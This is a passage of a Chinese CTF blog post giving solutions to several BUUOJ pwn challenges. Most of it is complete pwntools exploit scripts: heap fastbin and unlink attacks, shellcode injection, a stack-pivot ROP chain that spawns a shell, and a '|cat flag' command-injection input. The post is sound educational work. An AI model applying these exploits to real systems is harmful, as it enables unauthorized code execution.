    sla<span class="token punctuation">(</span><span class="token string">b'Command: '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Command: '</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">Print</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Command: '</span><span class="token punctuation">,</span><span class="token string">b'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment">#0  00</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment">#1  20</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment">#2  40</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment">#3  60</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>    <span class="token comment">#4  80</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment">#5</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment">#6</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment">#7</span>

delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
pal<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\x80'</span>
fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>pal<span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
pal<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
fill<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>pal<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>   <span class="token comment">#1</span>
<span class="token comment">#debug()</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>   <span class="token comment">#2 in 4</span>
pal<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span>
fill<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>pal<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
Print<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
data<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"addr==========>"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
main_arena_addr<span class="token operator">=</span>data<span class="token operator">-</span><span class="token number">88</span>
malloc_hook_addr<span class="token operator">=</span>main_arena_addr<span class="token operator">-</span><span class="token number">0x10</span>
fake_fastbin<span class="token operator">=</span>malloc_hook_addr<span class="token operator">-</span><span class="token number">0x23</span>   <span class="token comment">##size=7f</span>
libc_base<span class="token operator">=</span>data<span class="token operator">-</span><span class="token number">0x3C4B78</span>
add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>   <span class="token comment">#4</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>   <span class="token comment">#8</span>
add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>   <span class="token comment">#9</span>
add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>   <span class="token comment">#10</span>
delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
pal<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_fastbin<span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
fill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>pal<span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>   <span class="token comment">#9</span>
add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>   <span class="token comment">#10 fake_fastbin</span>
one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span> 
pal<span class="token operator">=</span><span class="token number">0x13</span><span class="token operator">*</span><span class="token string">b'a'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"fake_fast===>"</span><span class="token punctuation">,</span>fake_fastbin<span class="token punctuation">)</span>
fill<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>pal<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"malloc_hook===>"</span><span class="token punctuation">,</span>malloc_hook_addr<span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#3C4B78</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h3><p>虽然是一道很简单的题目，但是我一开始还真的没有做出来，记住malloc之后的堆块会清空</p>
<h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p>这道题第一眼就比较神奇，因为他不能ida反编译，估计是花指令之类的，但是我不会，只能读汇编啦</p>
<p>就是一个shellcode，很简单</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token comment">#sh=process('./mrctf2020_shellcode')</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29244</span><span class="token punctuation">)</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Show me your magic!\n'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p>这道题就是先格式字符串漏洞泄露canary，然后用puts(puts@got)来泄露libc基址</p>
<h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>这道题就是考察一个对于linux命令行的绕过了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">=</span> <span class="token char">' gnip'</span><span class="token punctuation">;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input the ip address:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">strcat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里就是输入<code>|cat flag</code>即可，关于这方面的内容我就写在另一篇md上了</p>
<h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">6020</span>C0<span class="token operator">:</span>magic
<span class="token number">6020E0</span><span class="token operator">:</span>heap_array<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>就是一个堆溢出</p>
<p>首先的思路肯定是覆盖一个大数字在magic上，然后就会想到unsortedbin attack，但是要已知fd，然后修改bk为<code>&amp;magic-0x10</code>，但是没有show类函数，搞不定？</p>
<p>那接下来就是unlink了，这个比较easy，简单说就是一个地址addr有chunk1的地址，然后修改chunk1的fd为addr-0x18，bk为addr-0x10，然后就显然了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token comment">#sh=process('./easyheap')</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25380</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./easyheap'</span><span class="token punctuation">)</span>

sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Size of Heap : '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'Content of heap:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Size of Heap : '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'Content of heap : '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

magic_addr<span class="token operator">=</span><span class="token number">0x6020C0</span>
heap_array<span class="token operator">=</span><span class="token number">0x6020E0</span>

add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>
pal1<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_array<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_array<span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>
pal2<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>pal2<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>pal1<span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token comment">#2 为0x6020d8</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token comment">#edit(0,b'10000000')</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里最有病的就是后门仅仅是提供一个system的符号表。</p>
<h3 id="二解-1"><a href="#二解-1" class="headerlink" title="二解"></a>二解</h3><p>​	先申请3个堆块，index分别为0，1，2，然后释放chunk2，接着edit chunk1溢出,修改chunk1数据为&#x2F;bin&#x2F;sh(因为后面要delete chunk1 getshell)修改chunk2的fd为一处与heaparray数组接近的地方，因为这里可以错位偏移构造一个size为0x7f的fake_chunk，绕过malloc对fastbin chunk的检查，让它插进fastbins ，之后从新申请回fake_chunk，利用fake_chunk溢出修改heaparray[0]的值为free_got,最后edit chunk0(现在为free_got)为system_plt,然后delete(1)执行system(“&#x2F;bin&#x2F;sh”) getshell</p>
<p>​	跟0ctf那题有异曲同工之妙，就是构造fake_fastbin</p>
<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>首先本道题</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">vul_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"GoodBye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vul_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">size_t</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token class-name">size_t</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-18h] BYREF</span>

  v0 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m1<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x200u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m2<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在大多数操作系统中，BSS 段的权限通常是可读写（RW）的，但不可执行（E）。</p>
<p>所以显然就是栈迁移，有地方让我们写，然后到main里让我们得以凑齐两个leave_ret，从而可以实施</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"i386"</span>
<span class="token comment">#sh=process("spwn")</span>

sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">26209</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"spwn"</span><span class="token punctuation">)</span>

write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
main<span class="token operator">=</span><span class="token number">0x08048513</span>
s_addr<span class="token operator">=</span><span class="token number">0x0804A300</span>
leave_ret<span class="token operator">=</span><span class="token number">0x08048511</span>
ret_addr<span class="token operator">=</span><span class="token number">0x08048312</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">)</span>
payload1<span class="token operator">=</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">)</span>
payload2<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>s_addr<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
write_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"write_addr="</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#libc=LibcSearcher("write",write_addr)</span>
<span class="token comment">#libc_base=write_addr-libc.dump("write")</span>
<span class="token comment">#print("libc_base=",end='')</span>
<span class="token comment">#print(hex(libc_base))</span>
libcbase <span class="token operator">=</span> write_addr <span class="token operator">-</span> <span class="token number">0x0d43c0</span>
system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x3a940</span>
binsh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x15902b</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">)</span>
payload3<span class="token operator">=</span>p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这道题让我感觉很奇怪，因为我用libcsearcher找的libc不能用，但是我用网上找的偏移确实正确的</p>
